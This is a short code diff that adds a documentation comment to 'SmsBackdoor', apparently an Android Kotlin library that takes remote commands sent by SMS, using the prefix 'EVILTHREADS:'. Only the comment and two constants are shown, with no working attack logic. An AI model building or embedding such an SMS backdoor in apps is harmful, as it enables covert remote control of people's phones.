@@ -40,6 +40,15 @@ import com.candroid.bootlaces.bootService
 ............\..............(
 ..............\.............\...
 */
+/**
+ * @author Chris Basinger
+ * @email evilthreads669966@gmail.com
+ * @date 10/08/20
+ *
+ * The container object for configuration data related to remote commands.
+ * Provides you with [SmsBackdoor.openDoor] which allows you to subscribe to received remote commands and also handles all intialization for the SMS backdoor.
+ * This is the only public method for SmsBackdoor libray module.
+ */
 object SmsBackdoor{
     internal val KEY_REMOTE_COMMAND = "KEY_REMOTE_COMMAND"
     internal var commandCode : String = "EVILTHREADS:"
